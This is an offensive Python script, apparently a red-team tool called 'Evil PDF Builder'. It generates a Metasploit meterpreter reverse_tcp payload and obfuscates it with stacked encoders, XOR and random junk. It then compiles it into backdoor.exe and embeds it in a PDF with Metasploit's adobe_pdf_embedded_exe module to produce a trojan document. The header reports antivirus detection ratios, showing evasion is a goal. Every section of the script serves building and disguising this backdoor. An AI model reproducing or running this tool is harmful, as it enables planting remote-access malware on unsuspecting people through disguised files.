#!/usr/bin/python
#coding: utf-8
###
# --------------------------------------------------------------
# PDF_encoder (utf-8) | Author: pedr0 Ubuntu [r00t-3xp10it]
# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
#
# Build shellcode in C format, encoded with XOR random key
# compile it into one .EXE and embedded into one PDF file
# --------------------------------------------------------------
#
# [DEPENDENCIES]
# metasploit | i586-mingw32msvc-gcc
#
# [detection ratio: 17/55]
# https://www.virustotal.com/pt/file/7e6dff68a5cf88477a7f8bc34d9b083ed5d60de84adcc79a417d0e559c6c1f08/analysis/1462189808/
# [detection ratio: 14/35]
# https://nodistribute.com/result/eAvpQrxRYX2PBig84IyKsw3tF0W
#
###


# ------------------------------
# imports
# ------------------------------
from struct import *
import os
import time
import commands
import subprocess
import random

 
# ------------------------------
# script colors
# ------------------------------
BLUE = '\033[94m'
RED = '\033[91m'
GREEN = '\033[32m'
WHITE  = '\033[0m'  
ORANGE  = '\033[33m'
CYAN = '\033[0;36m'
LIGHT_CYAN = '\033[1;36m'



# ------------------------------
# banner display
# ------------------------------
os.system("clear")
print ""+BLUE
print "    +------------------------------------------------------+"
print "    |                 "+WHITE+"- EVIL PDF BUILDER -"+BLUE+"                 |"
print "    | build shellcode in C format, encoded with random XOR |"
print "    |  key compiled to EXE and embedded into one PDF file  |"
print "    +------------------------------------------------------+"
print""+WHITE


# ------------------------------
# variable declaration
# ------------------------------
payload_raw = "template.raw"
out = "template.c"

skelleton = "Sk3lL3T0n"
key = random.randint(0,255)

#lhost = raw_input("[+] input lhost: ").strip()
#lport = raw_input("[+] input lport: ").strip()
lhost = "Lh0St"
lport = "lP0Rt"

# ----------------------
# Generating random junk
# ----------------------
print "["+GREEN+"✔"+WHITE+"] Generating random junk..."
time.sleep(3)
print "["+GREEN+"✔"+WHITE+"] Randomizing file size..."
randomSize = random.randint(20480,25600)

junkA = ""
junkB = "" 

junkA += "\""
for i in xrange(1,randomSize):
	junkA += chr(random.randint(65,90)) 
junkA +=  "\""

junkB += "\""
for i in xrange(0,randomSize):
	junkB += chr(random.randint(65,90)) 
junkB +=  "\""


# -------------------------------
# Generating metasploit shellcode
# -e x86/alpha_upper -i 4 -f raw
# -------------------------------
print "["+GREEN+"✔"+WHITE+"] Generating encoded shellcode..."
print "---"+BLUE
os.system("msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=%s LPORT=%s -e x86/shikata_ga_nai -i 9 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 4 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f c -o %s" % (lhost,lport,payload_raw))

a = open(payload_raw,"rb")
b = open(out,"w")

payload_raw = a.read()
tempArray = []
outArray = []
x = 0

# --------------------
# XOR encoding routine
# --------------------
print WHITE+"---"+WHITE
print "["+GREEN+"✔"+WHITE+"] Encoding with XOR key:",hex(key)
time.sleep(2)
print WHITE+"["+GREEN+"✔"+WHITE+"] Obfuscating shellcode..."
length = int(len(payload_raw)*2)

for i in xrange(0,length):
	if i % 2 == 0:
		tempArray.append(unpack("B",payload_raw[x])[0]^key)
		x += 1
	else:
		randomByte = random.randint(65,90)
		tempArray.append(randomByte)	
for i in range(0,len(tempArray)):
	tempArray[i]="\\x%x"%tempArray[i]
for i in range(0,len(tempArray),15):
	outArray.append('\n"'+"".join(tempArray[i:i+15])+"\"")
outArray = "".join(outArray)

devide = "i % 2;"
  
open_skelleton = open(skelleton).read()
code = open_skelleton % (junkA,outArray,junkB,key,length,devide)
b.write(code)
b.flush()


# -------------------------------
# compiling payload using mingw32
# -------------------------------
print "["+GREEN+"✔"+WHITE+"] Compiling payload (mingw32)..."
os.system("i586-mingw32msvc-gcc -mwindows template.c")
time.sleep(2)
print "["+GREEN+"✔"+WHITE+"] Stripping sourcecode..."
os.system("strip --strip-debug a.exe")
time.sleep(2)
print "["+GREEN+"✔"+WHITE+"] Moving payload to home folder..."
os.system("mv a.exe ~/backdoor.exe")
time.sleep(2)


# --------------
# build pdf file
# -------------
print "---"
print ""+BLUE
print "    At this stage 'evil_pdf_builder' needs that attacker"
print "    inputs the full path for one existing pdf to be"
print "    embedded with our generated stand-alone executable."
print ""+WHITE
print "---"
original = raw_input("[+] Input path of PDF to be embedded: ").strip()
print "["+GREEN+"✔"+WHITE+"] Creating evil PDF (trojan horse)..."
time.sleep(2)
os.system("msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::CUSTOM backdoor.exe; set FILENAME backdoor.pdf; set INFILENAME %s; exploit; exit -y'" % (original))


time.sleep(2)
os.system("mv ~/.msf4/local/backdoor.pdf ~/backdoor.pdf")
print "["+GREEN+"✔"+WHITE+"] Cleaning old conf files..."
time.sleep(2)
print "["+GREEN+"✔"+WHITE+"] Done..."
time.sleep(2)


